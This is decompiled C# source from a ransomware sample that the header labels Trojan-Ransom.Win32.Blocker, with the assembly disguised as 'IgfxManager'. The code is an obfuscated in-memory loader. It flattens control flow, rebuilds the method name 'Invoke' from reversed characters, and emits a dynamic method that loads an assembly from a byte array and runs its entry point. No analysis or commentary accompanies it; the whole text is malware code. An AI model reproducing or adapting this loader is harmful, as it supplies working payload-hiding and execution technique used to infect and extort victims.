// Decompiled with JetBrains decompiler
// Type: ر⫆괟ବ壭ㆼ넠蟱
// Assembly: IgfxManager, Version=0.0.0.0, Culture=neutral, PublicKeyToken=80b8495c3b279c77
// MVID: 3A37F297-AC2C-4797-B496-21D6D30C76CD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Blocker.jlzn-0dbe907ef98d74fe92cdac8bb6a0f4a4465c6f987585f04ce9aa8e094df31b85.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

public class ر\u2AC6괟ବ壭\u31BC넠蟱
{
  private static char[] ᔂ\uFDD2䡀薙慔掄㚽ҽ;
  private static OpCode[] 쵺癛Ŵ娅ひ刯射\u070C;
  private static MethodInfo[] ᕘꤍ걋㠾൮輾规鴙;
  private static Type[] 뵑稵ﾲ\u2014\u338A릣ಉ맍;

  static ر\u2AC6괟ବ壭\u31BC넠蟱()
  {
    char[] chArray = new char[5];
    int num = 11;
    OpCode[] opCodeArray;
    MethodInfo[] methodInfoArray1;
    Type[] typeArray;
    while (true)
    {
      switch (-~(num - -~(~6 - (2 - 5))) - (4 ^ 6))
      {
        case 1:
          methodInfoArray1[0] = typeof (Assembly).GetMethods()[39];
          methodInfoArray1[1] = typeof (Assembly).GetMethods()[16];
          num = 2;
          continue;
        case 2:
          goto label_21;
        case 3:
          opCodeArray = new OpCode[10];
          opCodeArray[0] = OpCodes.Nop;
          opCodeArray[1] = OpCodes.Ldarg_0;
          opCodeArray[2] = OpCodes.Call;
          num = 7;
          continue;
        case 4:
          methodInfoArray1[2] = typeof (Type).GetMethods()[50];
          num = 13;
          continue;
        case 5:
          typeArray[0] = typeof (void);
          num = 17;
          continue;
        case 6:
          ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C = opCodeArray;
          num = 6;
          continue;
        case 7:
          typeArray[2] = typeof (object);
          ر\u2AC6괟ବ壭\u31BC넠蟱.뵑稵ﾲ\u2014\u338A릣ಉ맍 = typeArray;
          num = 0;
          continue;
        case 8:
          methodInfoArray1 = new MethodInfo[4];
          num = -1;
          continue;
        case 9:
          opCodeArray[3] = OpCodes.Callvirt;
          num = -2;
          continue;
        case 10:
          opCodeArray[9] = OpCodes.Ret;
          num = 4;
          continue;
        case 11:
          opCodeArray[6] = OpCodes.Ldc_I4_0;
          num = 14;
          continue;
        case 12:
          ر\u2AC6괟ବ壭\u31BC넠蟱.ᕘꤍ걋㠾൮輾规鴙 = methodInfoArray1;
          num = 12;
          continue;
        case 13:
          chArray[0] = 'E';
          chArray[1] = 'K';
          num = 16;
          continue;
        case 14:
          typeArray = new Type[3];
          num = 3;
          continue;
        case 15:
          MethodInfo[] methodInfoArray2 = methodInfoArray1;
          Type type = typeof (MethodBase);
          typeArray = new Type[2]
          {
            typeof (object),
            typeof (object[])
          };
          Type[] types = typeArray;
          MethodInfo method = type.GetMethod("Invoke", types);
          methodInfoArray2[3] = method;
          num = 10;
          continue;
        case 16:
          opCodeArray[7] = OpCodes.Newarr;
          opCodeArray[8] = OpCodes.Pop;
          num = 8;
          continue;
        case 17:
          chArray[4] = 'N';
          ر\u2AC6괟ବ壭\u31BC넠蟱.ᔂ\uFDD2䡀薙慔掄㚽ҽ = chArray;
          num = 1;
          continue;
        case 18:
          chArray[2] = 'O';
          chArray[3] = 'V';
          num = 15;
          continue;
        case 19:
          typeArray[1] = typeof (byte[]);
          num = 5;
          continue;
        default:
          opCodeArray[4] = OpCodes.Ldelem_Ref;
          opCodeArray[5] = OpCodes.Ldnull;
          num = 9;
          continue;
      }
    }
label_21:;
  }

  public ر\u2AC6괟ବ壭\u31BC넠蟱()
  {
    int num = -1;
    MethodInfo[] methodInfoArray;
    while (true)
    {
      switch (-~(num - -~(~6 - (2 - 5))) - (4 ^ 6))
      {
        case 1:
          Array.Reverse((Array) ر\u2AC6괟ବ壭\u31BC넠蟱.ᔂ\uFDD2䡀薙慔掄㚽ҽ);
          num = 0;
          continue;
        case 2:
          methodInfoArray = new MethodInfo[4]
          {
            typeof (Assembly).GetMethods()[39],
            typeof (Assembly).GetMethods()[16],
            null,
            null
          };
          num = 1;
          continue;
        case 3:
          methodInfoArray[2] = typeof (Type).GetMethods()[50];
          methodInfoArray[3] = typeof (MethodBase).GetMethod("I" + new string(ر\u2AC6괟ବ壭\u31BC넠蟱.ᔂ\uFDD2䡀薙慔掄㚽ҽ).ToLower(), new Type[2]
          {
            typeof (object),
            typeof (object[])
          });
          num = -2;
          continue;
        case 4:
          goto label_6;
        default:
          ر\u2AC6괟ବ壭\u31BC넠蟱.ᕘꤍ걋㠾൮輾规鴙 = methodInfoArray;
          num = 2;
          continue;
      }
    }
label_6:;
  }

  public static void 屚\uF1B7尾몷\u0DFA쬆\uE1CC䈙(ref ر\u2AC6괟ବ壭\u31BC넠蟱.I _param0)
  {
    DynamicMethod dynamicMethod = new DynamicMethod("", ر\u2AC6괟ବ壭\u31BC넠蟱.뵑稵ﾲ\u2014\u338A릣ಉ맍[0], new Type[1]
    {
      ر\u2AC6괟ବ壭\u31BC넠蟱.뵑稵ﾲ\u2014\u338A릣ಉ맍[1]
    }, true);
    ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
    int num = 3;
    while (true)
    {
      switch (-~(num - -~(~6 - (2 - 5))) - (4 ^ 6))
      {
        case 1:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[7], ر\u2AC6괟ବ壭\u31BC넠蟱.뵑稵ﾲ\u2014\u338A릣ಉ맍[2]);
          num = 4;
          continue;
        case 2:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[0]);
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[9]);
          num = 8;
          continue;
        case 3:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[3], ر\u2AC6괟ବ壭\u31BC넠蟱.ᕘꤍ걋㠾൮輾规鴙[2]);
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[6]);
          num = 2;
          continue;
        case 4:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[4]);
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[5]);
          num = 6;
          continue;
        case 5:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[0]);
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[1]);
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[2], ر\u2AC6괟ବ壭\u31BC넠蟱.ᕘꤍ걋㠾൮輾规鴙[0]);
          num = -2;
          continue;
        case 6:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[3], ر\u2AC6괟ବ壭\u31BC넠蟱.ᕘꤍ걋㠾൮輾规鴙[3]);
          num = 7;
          continue;
        case 7:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[6]);
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[4]);
          num = 1;
          continue;
        case 8:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[6]);
          num = -1;
          continue;
        case 9:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[8]);
          num = 0;
          continue;
        case 10:
          goto label_12;
        default:
          ilGenerator.Emit(ر\u2AC6괟ବ壭\u31BC넠蟱.쵺癛Ŵ娅ひ刯射\u070C[3], ر\u2AC6괟ବ壭\u31BC넠蟱.ᕘꤍ걋㠾൮輾规鴙[1]);
          num = 5;
          continue;
      }
    }
label_12:
    _param0 = (ر\u2AC6괟ବ壭\u31BC넠蟱.I) dynamicMethod.CreateDelegate(typeof (ر\u2AC6괟ବ壭\u31BC넠蟱.I));
  }

  public delegate void I(byte[] input);
}
